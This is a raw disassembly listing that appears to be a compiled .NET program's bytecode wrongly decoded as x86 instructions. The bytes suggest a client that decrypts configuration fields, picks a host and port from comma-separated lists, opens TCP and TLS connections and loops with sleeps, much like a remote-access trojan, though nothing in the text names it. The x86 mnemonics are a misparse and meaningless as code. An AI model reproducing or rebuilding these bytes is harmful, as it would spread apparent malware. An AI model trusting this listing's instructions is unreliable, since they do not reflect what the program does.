  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	9d                   	popf
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	50                   	push   %eax
  4028ec:	02 00                	add    (%eax),%al
  4028ee:	70 80                	jo     0x402870
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	03 03                	add    (%ebx),%eax
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	17                   	pop    %ss
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	2b 03                	sub    (%ebx),%eax
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	85 03                	test   %eax,(%ebx)
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	60                   	pusha
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	bb 16 00 70 80       	mov    $0x80700016,%ebx
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	6e                   	outsb  %ds:(%esi),(%dx)
  402932:	1e                   	push   %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	21 1f                	and    %ebx,(%edi)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	d4 1f                	aam    $0x1f
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	87 20                	xchg   %esp,(%eax)
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	8b 20                	mov    (%eax),%esp
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	3e 21 00             	and    %eax,%ds:(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 48 21 00       	add    $0x214872,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	48                   	dec    %eax
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 4a 21    	add    %esp,0x214a7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
